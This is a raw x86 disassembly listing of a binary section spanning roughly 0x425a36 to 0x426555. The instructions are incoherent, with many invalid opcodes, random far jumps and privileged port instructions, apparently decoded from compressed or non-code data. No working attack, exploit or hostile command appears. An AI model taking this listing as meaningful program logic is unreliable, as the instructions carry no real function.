  425a36:	add    BYTE PTR [esi+edx*4-0x1f058688],bl
  425a3d:	jp     0x425aa9
  425a3f:	or     DWORD PTR [edx+0x0],ebx
	...
  425ab1:	add    BYTE PTR [eax],al
  425ab3:	add    BYTE PTR [esi],al
  425ab5:	aas    
  425ab6:	or     eax,0xb6bb3db9
  425abb:	mov    edi,0xa9fcb6ec
  425ac0:	push   edi
  425ac1:	mov    al,ds:0x90db7fb4
  425ac6:	add    DWORD PTR [eax],eax
  425ac8:	cmc    
  425ac9:	add    BYTE PTR [eax],al
  425acb:	add    BYTE PTR [eax],dh
  425acd:	cli    
  425ace:	cld    
  425acf:	jmp    0x425b2e
  425ad1:	jmp    FWORD PTR [ebx]
  425ad3:	fs push edi
  425ad5:	pop    ebx
  425ad6:	out    dx,al
  425ad7:	push   esi
  425ad8:	cmp    al,0x89
  425ada:	sahf   
  425adb:	or     al,0x74
  425add:	dec    edi
  425ade:	push   cs
  425adf:	ins    BYTE PTR es:[edi],dx
  425ae0:	xor    eax,0xcfdba296
  425ae5:	pop    ds
  425ae6:	push   ds
  425ae7:	fmul   QWORD PTR [eax+0x53]
  425aea:	adc    eax,0xe80c1aa0
  425aef:	push   ss
  425af0:	arpl   si,sp
  425af2:	retf   0xa4dc
  425af5:	(bad)  
  425af6:	xor    al,ch
  425af8:	(bad)  
  425af9:	scas   eax,DWORD PTR es:[edi]
  425afa:	mov    ebx,0x61cfc4ef
  425aff:	in     al,0x1d
  425b01:	repnz popf 
  425b03:	test   eax,0xe056b5c
  425b08:	(bad)  
  425b09:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425b0a:	arpl   WORD PTR [eax-0x4a],si
  425b0d:	imul   ebp,eax,0xc7dd39d7
  425b13:	jae    0x425aec
  425b15:	xchg   esi,eax
  425b16:	fldenv [eax+0x345539c6]
  425b1c:	add    BYTE PTR [edi],ch
  425b1e:	rcl    DWORD PTR [esi+edi*4-0x80],cl
  425b22:	ja     0x425b0e
  425b24:	in     eax,dx
  425b25:	das    
  425b26:	or     al,0xd5
  425b28:	push   DWORD PTR [eax]
  425b2a:	out    0xca,eax
  425b2c:	inc    ebx
  425b2d:	outs   dx,BYTE PTR ds:[esi]
  425b2f:	out    dx,eax
  425b30:	or     al,0x21
  425b32:	int3   
  425b33:	push   ss
  425b34:	stc    
  425b35:	jmp    0x6580:0x2f47166f
  425b3c:	inc    edx
  425b3e:	enter  0x8da0,0xf6
  425b42:	jnp    0x425b2b
  425b44:	les    esi,FWORD PTR [edi+0x4b]
  425b47:	(bad)  
  425b48:	int3   
  425b49:	int    0xac
  425b4b:	and    al,0xe2
  425b4d:	inc    ebp
  425b4e:	cld    
  425b4f:	popf   
  425b50:	aam    0xf8
  425b52:	xchg   ecx,eax
  425b53:	(bad)  
  425b55:	pop    edx
  425b56:	dec    edi
  425b57:	xor    ah,BYTE PTR [ebp+esi*4-0x63]
  425b5b:	scas   al,BYTE PTR es:[edi]
  425b5c:	ffree  st(6)
  425b5e:	mov    ds:0x2b04f352,eax
  425b63:	xchg   ebp,eax
  425b64:	pop    edi
  425b65:	jle    0x425b7b
  425b67:	out    0xea,eax
  425b69:	jmp    0xe997:0x8ef315a8
  425b70:	mov    ah,0xe4
  425b72:	xchg   ebp,eax
  425b73:	(bad)  
  425b74:	nop
  425b75:	adc    ebx,edi
  425b77:	frstor [ecx+0x7c]
  425b7a:	(bad)  
  425b7b:	aaa    
  425b7c:	mov    eax,ds:0x46fd12f4
  425b81:	aam    0xf8
  425b83:	inc    esp
  425b84:	call   0x1d42:0x20c86184
  425b8b:	mov    cl,cl
  425b8d:	jno    0x425bef
  425b8f:	jbe    0x425bf0
  425b91:	mov    dh,BYTE PTR [edx-0x51]
  425b94:	sub    dh,BYTE PTR [edx]
  425b96:	bound  ebp,QWORD PTR [eax+0x3852e426]
  425b9c:	xor    bh,cl
  425b9e:	and    al,0x73
  425ba0:	or     ebx,DWORD PTR [edx]
  425ba2:	push   edi
  425ba3:	mov    ebp,0xc6927a11
  425ba8:	bound  esi,QWORD PTR [eax]
  425baa:	push   ebx
  425bab:	cmp    al,0xa0
  425bad:	jp     0x425c2e
  425baf:	and    al,0xee
  425bb1:	aam    0xee
  425bb3:	pop    edi
  425bb4:	arpl   WORD PTR [edx+esi*8],bx
  425bb7:	mov    ecx,0x7344485c
  425bbc:	aad    0xde
  425bbe:	xchg   ebp,eax
  425bbf:	icebp  
  425bc0:	inc    ecx
	...
  425c31:	add    BYTE PTR [eax],al
  425c33:	add    BYTE PTR [edx+ebx*8-0x4c],ch
  425c37:	push   0xffffffb6
  425c39:	outs   dx,BYTE PTR ds:[esi]
  425c3a:	(bad)  
  425c3b:	fdivp  st(2),st
  425c3d:	sub    ch,cl
  425c3f:	call   0x91d0:0x974616b9
  425c46:	add    DWORD PTR [eax],eax
  425c48:	cmc    
  425c49:	add    BYTE PTR [eax],al
  425c4b:	add    BYTE PTR [esp+ebp*4-0x107b9ac3],ah
  425c52:	fnstsw WORD PTR [ebx-0x7f11ce4b]
  425c58:	mov    edi,DWORD PTR [edx-0x51]
  425c5b:	cs jb  0x425c99
  425c5e:	push   ss
  425c5f:	aaa    
  425c60:	popa   
  425c61:	loope  0x425cd4
  425c63:	jae    0x425c1f
  425c65:	not    ebp
  425c67:	iret   
  425c68:	js     0x425c58
  425c6a:	push   ecx
  425c6b:	das    
  425c6c:	inc    esp
  425c6d:	shl    DWORD PTR [ebx+0x48300187],cl
  425c73:	in     eax,0xd1
  425c75:	daa    
  425c76:	push   es
  425c77:	mov    WORD PTR [edx-0x7850c574],?
  425c7d:	sbb    eax,0x3aa8f8eb
  425c82:	pop    ecx
  425c83:	mov    ebp,0x677e6704
  425c88:	xchg   DWORD PTR [ecx+0x73f77494],ebx
  425c8e:	adc    al,0x43
  425c90:	and    BYTE PTR [edi],bh
  425c92:	sbb    bl,BYTE PTR [eax-0x60a7c800]
  425c98:	cmp    ebp,DWORD PTR [eax+0x671142de]
  425c9e:	mov    cs,WORD PTR ds:0x941c4712
  425ca4:	mov    edi,0x557522d6
  425ca9:	(bad)  
  425caa:	adc    al,0x94
  425cac:	int3   
  425cad:	shl    BYTE PTR ds:0x3f288f9d,0x33
  425cb4:	clc    
  425cb5:	outs   dx,BYTE PTR ss:[esi]
  425cb7:	pop    es
  425cb8:	pop    es
  425cb9:	add    dh,BYTE PTR [ebp+0x4c]
  425cbc:	outs   dx,BYTE PTR ds:[esi]
  425cbd:	push   ds
  425cbe:	push   esi
  425cbf:	sub    al,0x13
  425cc1:	sub    al,0x44
  425cc3:	ret    0xc880
  425cc6:	fst    DWORD PTR [ecx+edi*2]
  425cc9:	in     eax,dx
  425cca:	cdq    
  425ccb:	nop
  425ccc:	add    edx,ecx
  425cce:	adc    eax,0x53eaa981
  425cd3:	scas   eax,DWORD PTR es:[edi]
  425cd4:	mov    dh,0xd4
  425cd6:	push   ds
  425cd7:	out    0x15,al
  425cd9:	je     0x425ca2
  425cdb:	ins    DWORD PTR es:[edi],dx
  425cdc:	dec    eax
  425cdd:	or     eax,0x51
  425ce0:	repz sub BYTE PTR [ebx-0x43],ch
  425ce4:	loop   0x425d16
  425ce6:	std    
  425ce7:	rcl    BYTE PTR [ebx],1
  425ce9:	inc    esp
  425cea:	div    BYTE PTR ds:0x53c290db
  425cf0:	sbb    al,0x12
  425cf2:	jge    0x425ce6
  425cf4:	jne    0x425c84
  425cf6:	jg     0x825db83
  425cfc:	daa    
  425cfd:	shl    BYTE PTR [esi-0x2b0a6087],0x30
  425d04:	shr    BYTE PTR [edi],1
  425d06:	inc    ebp
  425d07:	or     al,0x43
  425d09:	push   edi
  425d0a:	pop    esi
  425d0b:	aad    0xf9
  425d0d:	mov    dl,0xbb
  425d0f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425d10:	dec    ebx
  425d11:	dec    ebx
  425d12:	mov    ch,0xef
  425d14:	cwde   
  425d15:	mov    eax,ds:0xda437381
  425d1a:	dec    esi
  425d1b:	mov    esi,0x3269b7c2
  425d20:	mov    esi,0x593dab3d
  425d25:	ret    
  425d26:	xor    dl,al
  425d28:	dec    eax
  425d29:	enter  0x55cb,0xf9
  425d2d:	retf   0x3a48
  425d30:	cs gs cli 
  425d33:	or     al,0x94
  425d35:	mov    ds:0x80cbff1f,eax
  425d3a:	mov    edx,0xc71a81dd
  425d3f:	inc    ebp
  425d40:	push   ss
	...
  425db1:	add    BYTE PTR [eax],al
  425db3:	add    BYTE PTR ds:0xf361d20c,bh
  425db9:	(bad)  
  425dba:	mov    edi,0xa480315c
  425dbf:	in     al,dx
  425dc0:	out    0x65,eax
  425dc2:	lods   eax,DWORD PTR ds:[esi]
  425dc3:	aaa    
  425dc4:	lds    edx,FWORD PTR [edx+0xf50001]
  425dca:	add    BYTE PTR [eax],al
  425dcc:	pop    ebx
  425dcd:	adc    al,0x73
  425dcf:	outs   dx,DWORD PTR ds:[esi]
  425dd0:	xor    eax,0x457aa59
  425dd5:	adc    DWORD PTR [ecx+0x69],ecx
  425dd8:	dec    ebp
  425dd9:	ss cdq 
  425ddb:	add    BYTE PTR [ebx],bh
  425ddd:	mov    edx,0x44b96895
  425de2:	dec    ebp
  425de3:	xchg   BYTE PTR [eax+0x71],dh
  425de6:	shr    al,cl
  425de8:	clc    
  425de9:	xor    eax,0x8f8fb919
  425dee:	xchg   esi,eax
  425def:	and    al,0x99
  425df1:	pop    eax
  425df2:	inc    ecx
  425df3:	add    BYTE PTR [edi+eiz*1],ch
  425df6:	int3   
  425df7:	mov    esi,0x3886a197
  425dfc:	out    0x2,eax
  425dfe:	(bad)
  425e02:	jge    0x425e0c
  425e04:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425e05:	(bad)  
  425e07:	or     bl,BYTE PTR [ebp-0x44]
  425e0a:	mov    ds:0xb154752f,eax
  425e0f:	and    edi,0x35ae7a49
  425e15:	xor    BYTE PTR [edx-0x51],al
  425e18:	mov    bl,0x96
  425e1a:	jo     0x425def
  425e1c:	mov    BYTE PTR [ecx+ebx*4],al
  425e1f:	pop    ss
  425e20:	dec    esp
  425e21:	arpl   WORD PTR [ecx],di
  425e23:	retf   
  425e24:	mov    al,0x2d
  425e26:	jne    0x425e03
  425e28:	mov    ebp,0xddc0358a
  425e2d:	inc    esi
  425e2e:	aam    0xa3
  425e30:	sahf   
  425e31:	xchg   esi,eax
  425e32:	xchg   esp,eax
  425e33:	pushf  
  425e34:	adc    eax,0xddb232d2
  425e39:	mov    ecx,0x10656cd
  425e3e:	(bad)  
  425e3f:	je     0x425e68
  425e41:	ins    DWORD PTR es:[edi],dx
  425e42:	mov    bl,0x9e
  425e44:	sub    bh,al
  425e46:	sub    DWORD PTR [edi],edx
  425e48:	add    eax,0x8ff67951
  425e4d:	jmp    0x425eb1
  425e4f:	jo     0x425e8b
  425e51:	cdq    
  425e52:	popa   
  425e53:	mov    BYTE PTR [edi+ebx*8+0xdf3aa69],ch
  425e5a:	fidiv  WORD PTR [esi]
  425e5c:	pop    ss
  425e5d:	dec    eax
  425e5e:	call   0xadae:0x15dce793
  425e65:	lahf   
  425e66:	push   ds
  425e67:	fs ins BYTE PTR es:[edi],dx
  425e69:	adc    dl,ch
  425e6b:	rol    DWORD PTR [edi+eiz*1+0x41],cl
  425e6f:	push   esp
  425e70:	push   esp
  425e71:	pusha  
  425e72:	mov    esp,0x113de1db
  425e77:	and    al,0xec
  425e79:	cmp    BYTE PTR [ebx+0x75e7bd4f],0x27
  425e80:	dec    ebp
  425e81:	mov    ah,0x4d
  425e83:	gs leave 
  425e85:	mov    eax,ds:0x9cc8d88b
  425e8a:	pop    esp
  425e8b:	adc    al,BYTE PTR [edi-0x45]
  425e8e:	xchg   DWORD PTR [ebp-0x3575c1c6],ebx
  425e94:	ss pop esp
  425e96:	imul   eax,DWORD PTR [esi],0xbed4f74e
  425e9c:	push   ss
  425e9d:	fs clc 
  425e9f:	mov    edx,0xdd809c9f
  425ea4:	xor    al,0xa5
  425ea6:	outs   dx,BYTE PTR ds:[esi]
  425ea7:	and    bl,al
  425ea9:	add    BYTE PTR [ebx-0x67a3f40e],cl
  425eaf:	test   DWORD PTR ds:0x5b333373,0x457e4abf
  425eb9:	das    
  425eba:	mov    eax,0x330e156d
  425ebf:	adc    eax,0xc0
	...
  425f34:	dec    ebx
  425f35:	push   ss
  425f36:	int    0x41
  425f38:	fstp   st(3)
  425f3a:	iret   
  425f3b:	push   ds
  425f3c:	lock leave 
  425f3e:	jmp    DWORD PTR [ecx+0x5b]
  425f41:	and    eax,0x93bae990
  425f46:	add    DWORD PTR [eax],eax
  425f48:	cmc    
  425f49:	add    BYTE PTR [eax],al
  425f4b:	add    BYTE PTR [esi],cl
  425f4d:	dec    esi
  425f4e:	loopne 0x425ed5
  425f50:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425f51:	pop    esp
  425f52:	aas    
  425f53:	das    
  425f54:	dec    esi
  425f55:	lahf   
  425f56:	dec    ebx
  425f57:	xchg   edx,eax
  425f58:	mov    bl,0xbc
  425f5a:	pop    ecx
  425f5b:	push   0x9f004658
  425f60:	shl    DWORD PTR [edx],cl
  425f62:	(bad)  
  425f63:	and    ah,BYTE PTR [eax-0x3a]
  425f66:	repnz xchg edi,eax
  425f68:	bound  esp,QWORD PTR [ebx]
  425f6a:	sub    BYTE PTR fs:[edx+edx*4],bl
  425f6e:	iret   
  425f6f:	or     DWORD PTR [esi],ebx
  425f71:	fcmovnu st,st(5)
  425f73:	sub    eax,0x34ce5fd5
  425f78:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425f79:	jbe    0x425f24
  425f7b:	repz xchg ebx,eax
  425f7d:	mov    al,0x2d
  425f7f:	in     eax,dx
  425f80:	cmp    al,0x17
  425f82:	pusha  
  425f83:	pop    ds
  425f84:	jmp    0x68c15044
  425f89:	das    
  425f8a:	aaa    
  425f8b:	pop    ebp
  425f8c:	mov    ds:0xd3be023b,eax
  425f91:	push   ebp
  425f92:	xchg   DWORD PTR [eax-0x25],edi
  425f95:	and    bh,BYTE PTR [ebp-0x63]
  425f98:	paddsw mm6,mm2
  425f9b:	mov    dl,0x34
  425f9d:	mov    dh,0x25
  425f9f:	push   edx
  425fa0:	push   0xdf1e095c
  425fa5:	loope  0x425f2c
  425fa7:	sbb    BYTE PTR [eax+ecx*4-0x372000c6],0xdf
  425faf:	ror    dl,cl
  425fb1:	and    al,BYTE PTR [ebx]
  425fb3:	xchg   ecx,eax
  425fb4:	(bad)  
  425fb5:	call   0x506f:0x5be59a16
  425fbc:	adc    al,0x8c
  425fbe:	push   0x232f63d0
  425fc3:	mov    edi,0x687d70c4
  425fc8:	and    al,0x34
  425fca:	leave  
  425fcb:	iret   
  425fcc:	hlt    
  425fcd:	mov    cl,0xb8
  425fcf:	int3   
  425fd0:	in     al,dx
  425fd1:	mov    ah,0x7b
  425fd3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425fd4:	daa    
  425fd5:	rcl    BYTE PTR [eax-0x26],0xb0
  425fd9:	rol    DWORD PTR [esi-0x25],1
  425fdc:	out    0x7b,al
  425fde:	outs   dx,BYTE PTR ds:[esi]
  425fdf:	pop    esp
  425fe0:	sub    BYTE PTR fs:[esi-0x43],al
  425fe4:	lea    eax,[ebx]
  425fe6:	cmc    
  425fe7:	hlt    
  425fe8:	jmp    0x425fb5
  425fea:	jns    0x425f8f
  425fec:	outs   dx,DWORD PTR ds:[esi]
  425fed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425fee:	in     al,dx
  425fef:	jge    0x425fb3
  425ff1:	mov    gs,WORD PTR gs:[ebx]
  425ff4:	add    al,BYTE PTR [ecx]
  425ff6:	and    DWORD PTR [ecx-0xfb68dd7],eax
  425ffc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425ffd:	or     eax,0xd75fddfc
  426002:	int    0x8
  426004:	out    dx,eax
  426005:	shl    DWORD PTR [ecx-0x6911e5c4],1
  42600b:	cli    
  42600c:	xchg   ecx,eax
  42600d:	loop   0x425fc3
  42600f:	repnz inc edi
  426011:	dec    ebp
  426012:	outs   dx,BYTE PTR ds:[esi]
  426013:	mov    esi,0xd4ac1b17
  426018:	jb     0x426098
  42601a:	dec    edx
  42601b:	or     cl,al
  42601d:	fwait
  42601e:	pop    ecx
  42601f:	aad    0x4a
  426021:	call   0x3cf:0xb52848be
  426028:	cmp    dh,BYTE PTR [ebx]
  42602a:	imul   edx,DWORD PTR [eax-0x56],0x1653d6eb
  426031:	out    0xba,eax
  426033:	dec    edi
  426034:	stos   DWORD PTR es:[edi],eax
  426035:	pop    esp
  426036:	pop    ecx
  426037:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426038:	shr    DWORD PTR [eax-0xa],1
  42603b:	or     al,0xd6
  42603d:	add    BYTE PTR [edx],0xd3
  426040:	dec    edi
	...
  4260b1:	add    BYTE PTR [eax],al
  4260b3:	add    dh,bl
  4260b5:	adc    DWORD PTR [edi-0x15020dd],ebx
  4260bb:	std    
  4260bc:	sub    al,0x28
  4260be:	pop    ds
  4260bf:	mov    eax,ds:0xdf92b2f7
  4260c4:	scas   eax,DWORD PTR es:[edi]
  4260c5:	xchg   esp,eax
  4260c6:	add    DWORD PTR [eax],eax
  4260c8:	cmc    
  4260c9:	add    BYTE PTR [eax],al
  4260cb:	add    dh,bl
  4260cd:	pop    edi
  4260ce:	jmp    0x426063
  4260d0:	push   ds
  4260d1:	push   ds
  4260d2:	cmp    cl,BYTE PTR [ebx-0x60e91696]
  4260d8:	mov    edi,0x42c78732
  4260dd:	adc    al,0xab
  4260df:	ja     0x426160
  4260e1:	mov    bh,0x54
  4260e3:	and    BYTE PTR [edi],bl
  4260e5:	inc    esp
  4260e6:	dec    ebx
  4260e7:	je     0x426120
  4260e9:	lahf   
  4260ea:	add    edi,edi
  4260ec:	es add ecx,edi
  4260ef:	aas    
  4260f0:	loop   0x426140
  4260f2:	mov    ecx,0x7a176bf5
  4260f7:	xor    eax,0xc58391b0
  4260fc:	push   ss
  4260fd:	cmp    BYTE PTR [ebx],cl
  4260ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426100:	jnp    0x4260a8
  426102:	repz aad 0x54
  426105:	lods   al,BYTE PTR ds:[esi]
  426106:	fld    QWORD PTR [esi-0x39]
  426109:	dec    eax
  42610a:	out    0x22,al
  42610c:	jo     0x426122
  42610e:	lock cmc 
  426110:	out    0x91,eax
  426112:	jo     0x42609d
  426114:	mov    ch,0x99
  426116:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426117:	inc    ecx
  426118:	out    dx,eax
  426119:	(bad)
  42611c:	outs   dx,DWORD PTR ds:[esi]
  42611d:	sub    DWORD PTR [ecx-0x3c8ba9d4],esp
  426123:	push   edi
  426124:	pop    ecx
  426125:	pusha  
  426126:	mov    bh,0xeb
  426128:	ret    0xa2a0
  42612b:	jmp    0x8037:0xd0566b21
  426132:	(bad)  
  426133:	mov    bl,0x7c
  426135:	sbb    DWORD PTR [eax],esp
  426137:	test   eax,0xc8c91e92
  42613c:	fidivr WORD PTR [ecx]
  42613e:	outs   dx,BYTE PTR ds:[esi]
  42613f:	repz mov WORD PTR [ebx+0x79],gs
  426143:	xor    al,0x9
  426145:	inc    esp
  426146:	addr16 and eax,0xffccfdc6
  42614c:	test   DWORD PTR [edi],edx
  42614e:	sbb    al,0xe4
  426150:	pop    edx
  426151:	and    ch,bh
  426153:	retf   
  426154:	cwde   
  426155:	jg     0x4260da
  426157:	int3   
  426158:	xor    esp,DWORD PTR [edi-0x21]
  42615b:	pause  
  42615d:	ins    DWORD PTR es:[edi],dx
  42615e:	xchg   ebp,eax
  42615f:	push   ebx
  426160:	jmp    0x426128
  426162:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426163:	loopne 0x426100
  426165:	mov    ?,WORD PTR [edx-0x80]
  426168:	mov    eax,0x5e4f7506
  42616d:	arpl   WORD PTR [ebp+0x71eaef44],cx
  426173:	out    0xaf,al
  426175:	loope  0x426133
  426177:	inc    esp
  426178:	dec    ebp
  426179:	out    dx,eax
  42617a:	ss dec ebp
  42617c:	fisttp WORD PTR [edx+0x6b]
  42617f:	shufps xmm5,XMMWORD PTR [eax+0x13ade395],0x65
  426187:	(bad)  
  426188:	jmp    0x16a2cc8f
  42618d:	bnd ja 0x4261f4
  426190:	sbb    al,BYTE PTR [edi-0x3ff244ae]
  426196:	jp     0x4261a3
  426198:	fidivr DWORD PTR [ebp+0x1613a106]
  42619e:	push   edx
  42619f:	cmp    ebx,edx
  4261a1:	addr16 (bad) 
  4261a3:	icebp  
  4261a4:	mov    cl,0xcf
  4261a6:	aaa    
  4261a7:	mov    bh,0x57
  4261a9:	pop    ecx
  4261aa:	lds    ebp,FWORD PTR [ebp-0x7e]
  4261ad:	sbb    al,0xaa
  4261af:	mov    bh,0xab
  4261b1:	mov    dh,0x5d
  4261b3:	std    
  4261b4:	iret   
  4261b5:	ror    BYTE PTR [ebx-0x6c],cl
  4261b8:	or     BYTE PTR [ecx-0x3],ah
  4261bb:	mov    ah,0x82
  4261bd:	dec    DWORD PTR [ebx+0xca3c]
	...
  426233:	add    BYTE PTR [esp+eax*8-0x84318d],ch
  42623a:	mov    ebp,0xdfb43ee6
  42623f:	push   0xffffffae
  426241:	mov    bl,0x4f
  426243:	adc    al,0xa4
  426245:	xchg   ebp,eax
  426246:	add    DWORD PTR [eax],eax
  426248:	cmc    
  426249:	add    BYTE PTR [eax],al
  42624b:	add    BYTE PTR [ecx+0x7c],bl
  42624e:	daa    
  42624f:	xor    ecx,DWORD PTR [ebx]
  426251:	add    al,BYTE PTR [edi+0x3a]
  426254:	stos   DWORD PTR es:[edi],eax
  426255:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426256:	outs   dx,BYTE PTR ds:[esi]
  426257:	push   edx
  426258:	inc    edi
  426259:	sbb    BYTE PTR [ecx-0x21],0xba
  42625d:	aam    0xa9
  42625f:	icebp  
  426260:	jle    0x4262a8
  426262:	push   0xffffffbd
  426264:	push   cs
  426265:	mov    ah,0x6c
  426267:	push   ds
  426268:	fdivrp st(7),st
  42626a:	xchg   ebx,eax
  42626b:	add    eax,0xa41c2a5b
  426270:	aas    
  426271:	jge    0x42627b
  426273:	add    BYTE PTR [ebx],dl
  426275:	lods   eax,DWORD PTR ds:[esi]
  426276:	xor    eax,0x1058decc
  42627b:	cs icebp 
  42627d:	mov    dl,0xb1
  42627f:	sub    edx,DWORD PTR [ecx]
  426281:	mov    ebp,0xda8bb22f
  426286:	mov    al,0xd6
  426288:	rcr    BYTE PTR [ebx+0x28],cl
  42628b:	cmc    
  42628c:	cmp    BYTE PTR [edi+0x40dcb176],al
  426292:	pop    esp
  426293:	repnz inc ebp
  426295:	xor    BYTE PTR [eax],dh
  426297:	imul   ebx,DWORD PTR [edx-0x35a1ca61],0xae1e8c1b
  4262a1:	sub    DWORD PTR ds:0x2a887a1d,ebp
  4262a7:	xor    bh,ah
  4262a9:	inc    edi
  4262aa:	adc    eax,0x4872d732
  4262af:	cmp    eax,ebp
  4262b1:	(bad)  
  4262b3:	into   
  4262b4:	mov    WORD PTR [esi],?
  4262b6:	(bad)  
  4262b7:	adc    ah,BYTE PTR ds:0xb80b0081
  4262bd:	das    
  4262be:	pop    es
  4262bf:	aam    0x77
  4262c1:	mov    edx,0xcdfac074
  4262c6:	jecxz  0x42625c
  4262c8:	imul   esi,edx,0xffffff97
  4262cb:	loop   0x426253
  4262cd:	imul   ebp,DWORD PTR [esi-0x6a7dced7],0x3ad62dfc
  4262d7:	dec    esp
  4262d8:	loope  0x4262d3
  4262da:	repz dec esi
  4262dc:	jnp    0x4262ac
  4262de:	mov    gs,esi
  4262e0:	pop    esp
  4262e1:	xlat   BYTE PTR ds:[ebx]
  4262e2:	cmc    
  4262e3:	inc    ecx
  4262e4:	mov    eax,0x4966a0fd
  4262e9:	sbb    edi,DWORD PTR [esi-0x3]
  4262ec:	jo     0x4262a7
  4262ee:	cwde   
  4262ef:	sub    al,BYTE PTR [ebx+0x24]
  4262f2:	pop    es
  4262f3:	mov    ebp,0xaa660ad0
  4262f8:	nop
  4262f9:	lods   eax,DWORD PTR ds:[esi]
  4262fa:	mov    esp,0x47d0d0a7
  4262ff:	xlat   BYTE PTR ds:[ebx]
  426300:	mov    cl,0xae
  426302:	sbb    bl,BYTE PTR [eax+0x56]
  426305:	or     esp,DWORD PTR [edx-0x163a59d6]
  42630b:	adc    eax,0xfec8b2f2
  426310:	cmp    eax,0x9c18cb94
  426315:	sub    edi,ebp
  426317:	jg     0x426329
  426319:	loopne 0x4262e0
  42631b:	pop    esi
  42631c:	imul   edx,DWORD PTR [ecx],0xedd3db0
  426322:	loopne 0x4262d5
  426324:	push   eax
  426325:	rcl    BYTE PTR [ebx+0x26],1
  426328:	cld    
  426329:	retf   0x292f
  42632c:	cli    
  42632d:	in     eax,dx
  42632e:	(bad)  
  42632f:	icebp  
  426330:	shl    BYTE PTR [edx+0x7d3ee7bb],0x5e
  426337:	lods   eax,DWORD PTR ds:[esi]
  426339:	add    bh,BYTE PTR [ecx]
  42633b:	sub    dl,bh
  42633d:	cmp    DWORD PTR [ebx-0x2e],0xfffffff4
	...
  4263b1:	add    BYTE PTR [eax],al
  4263b3:	add    BYTE PTR [edx+0x9],al
  4263b6:	les    ebp,FWORD PTR [ecx-0x14901231]
  4263bc:	(bad)  
  4263be:	mov    dh,0xba
  4263c0:	(bad)  
  4263c1:	push   edx
  4263c2:	ds dec ebp
  4263c4:	cdq    
  4263c5:	xchg   esi,eax
  4263c6:	add    DWORD PTR [eax],eax
  4263c8:	cmc    
  4263c9:	add    BYTE PTR [eax],al
  4263cb:	add    BYTE PTR [edx],bl
  4263cd:	pop    es
  4263ce:	call   0xa73ee991
  4263d3:	push   edx
  4263d4:	lds    ecx,FWORD PTR [edx+0x6a]
  4263d7:	sar    bh,cl
  4263d9:	xor    BYTE PTR [edi],al
  4263db:	imul   ebx,DWORD PTR [esi-0x201eea8],0x14d8a3b9
  4263e5:	lods   eax,DWORD PTR ds:[esi]
  4263e6:	jmp    0xfa81:0x9cc9d9
  4263ed:	sub    esp,esp
  4263ef:	and    BYTE PTR [ebp+0x58],bh
  4263f2:	mov    WORD PTR [esp+eax*8+0x35fa9190],cs
  4263f9:	fdiv   QWORD PTR [eax]
  4263fb:	shl    BYTE PTR [ebx-0x55],cl
  4263fe:	cmc    
  4263ff:	shr    bh,0xa0
  426402:	inc    esi
  426403:	dec    edi
  426404:	add    eax,0xfdc0a8d9
  426409:	sbb    esp,DWORD PTR [eax+0xa8e31ec]
  42640f:	je     0x42640e
  426411:	out    0x62,eax
  426413:	sbb    eax,0x2d558ca3
  426418:	repnz in eax,dx
  42641a:	dec    ebx
  42641b:	iret   
  42641c:	fisub  WORD PTR [edi]
  42641e:	sbb    eax,0x35e1c5d8
  426423:	mov    edi,0x9ea57ab1
  426428:	cs push 0x23
  42642b:	adc    eax,0x554f3505
  426430:	jecxz  0x426428
  426432:	and    al,0x9c
  426434:	adc    DWORD PTR [edi],esi
  426436:	hlt    
  426437:	(bad)
  42643a:	adc    BYTE PTR [edx-0x3d],al
  42643d:	mov    esp,0xa61629d5
  426442:	addr16 push eax
  426444:	mov    cl,0x4a
  426446:	adc    al,0x2a
  426448:	jne    0x426455
  42644a:	jne    0x42647c
  42644c:	pop    edx
  42644d:	mov    al,BYTE PTR [edx-0xa]
  426450:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426451:	stos   DWORD PTR es:[edi],eax
  426452:	js     0x4263f2
  426454:	loopne 0x426470
  426456:	sbb    BYTE PTR [ebx],dl
  426458:	fcmove st,st(0)
  42645a:	jge    0x4263fa
  42645c:	fadd   st(6),st
  42645e:	adc    ah,BYTE PTR [ecx+ebx*2]
  426461:	jl     0x426457
  426463:	ds stc 
  426465:	inc    eax
  426466:	icebp  
  426467:	mov    eax,0xb58d92c3
  42646c:	inc    edx
  42646d:	in     eax,dx
  42646e:	sar    BYTE PTR [edx],1
  426470:	adc    BYTE PTR ds:0xe29672f9,0x91
  426477:	test   DWORD PTR [edx+0x10bfcd31],esi
  42647d:	mov    edi,DWORD PTR [esi]
  42647f:	push   0x40f7281d
  426484:	jge    0x426477
  426486:	out    0x7a,al
  426488:	gs xchg ebp,eax
  42648a:	loope  0x426412
  42648c:	cli    
  42648d:	inc    edi
  42648e:	inc    ecx
  42648f:	push   es
  426490:	aas    
  426491:	fnstsw WORD PTR [eax-0x28]
  426494:	add    ebp,ebp
  426496:	int    0xe8
  426498:	pop    es
  426499:	push   ds
  42649a:	loopne 0x426461
  42649c:	das    
  42649d:	ror    DWORD PTR [esi+0x37b91794],0x9f
  4264a4:	xchg   BYTE PTR [ebx-0x1df4a938],bl
  4264aa:	inc    edx
  4264ab:	mov    ds:0x2a8b4dc1,al
  4264b0:	mov    eax,DWORD PTR [edx-0x4a322323]
  4264b6:	mov    edx,DWORD PTR [edx-0x7e9f0006]
  4264bc:	mov    cl,0x13
  4264be:	in     eax,dx
  4264bf:	mov    ebx,?
	...
  426531:	add    BYTE PTR [eax],al
  426533:	add    ah,al
  426535:	jmp    0xfef4:0xfe6e7a4e
  42653c:	loop   0x42656c
  42653e:	dec    ebx
  42653f:	pop    esp
  426540:	repz add ah,BYTE PTR [edi+0x1978e7f]
  426547:	add    ch,dh
  426549:	add    BYTE PTR [eax],al
  42654b:	add    BYTE PTR [ecx],bh
  42654d:	mov    BYTE PTR [eax+0x74faf316],al
  426553:	in     eax,0xf4
  426555:	pop    ebx
